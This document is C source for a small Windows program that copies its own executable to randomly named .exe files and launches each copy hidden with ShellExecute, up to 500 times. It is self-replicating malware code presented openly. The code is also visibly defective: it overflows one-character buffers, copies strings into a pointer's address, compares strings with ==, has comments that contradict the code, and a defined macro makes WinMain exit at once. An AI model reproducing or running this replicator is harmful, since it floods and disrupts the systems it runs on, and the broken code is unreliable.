   #define W32_LEAN_AND_MEAN
   #define TSARSTRUCT 1052
   #include <windows.h>
   #include <stdlib.h>
   #include <stdio.h>
   #include <time.h>

   // character string to generate random filename
   char *beg[65] = {
   "a","b","c","d","e","f","g","h","i","j","k","l","m","n",
   "o","p","q","r","s","t","u","v","w","x","y","z","A","B",
   "C","D","E","F","G","H","I","J","K","L","M","N","O","P",
   "Q","R","S","T","U","V","W","X","y","Z","1","2","3","4",
                "5","6","7","8","9","0","-","_"
   };
   int ret = 0;
   // ret is our control integer
   // we will only go through 500 times to save ram.

   char *path = "";

   char * getpath()
   {
   char *path = (char*)malloc(1024);
   HINSTANCE hinst = GetModuleHandle(NULL); //get our module handle
   GetModuleFileName(hinst,path,1024);
   return path;
   }

   void genfile()
   {
       srand(time(NULL));
   int len = rand() % 25;
   int b;
   // generate random number from 1-50
   char buff;
   strcpy(&buff," ");
   // clear buffer
   int x = 0;
       srand(time(NULL));
   /*This is going to go into
   a non ending loop*/
   #ifndef TSARSTRUCT
   return;
   #endif
   while (1) {
   x++;
           b = rand() % 65;
   //get random number from 1-85
   strcat(&buff,(const char*)beg[b]);
   // concat to the end of the buffer the value of the character
   if (x==len)
   {
         strcat(&buff,".exe");
               strcpy(&path,&buff);
               return;
   }
   }
   }


   void Atom()
   {
   // we will now split the atom!
   ret++; // increment ret
   char pat, *pt;
   genfile(); //generate filename
   pt = &pat;
   if (path=="")
      return;
   pt = getpath(); // get the path to our file
   CopyFile((LPCTSTR)pt,(LPCTSTR)path,0);
   // here we copy the file to the random filename generated path
   // then we will restart
   ShellExecute(0,"open",(const char*)path,NULL,NULL,SW_HIDE);
   // this will execute the copied file
   if (ret==500)
   return; //if our shelled number is equal to 500 we will end
   }




   int APIENTRY WinMain(HINSTANCE hInstance,
                        HINSTANCE hPrevInstance,
                        LPSTR     lpCmdLine,
                        int       nCmdShow)
   {
   #ifdef TSARSTRUCT
   return 0;
   #endif
   Atom();
   return 0;
   }
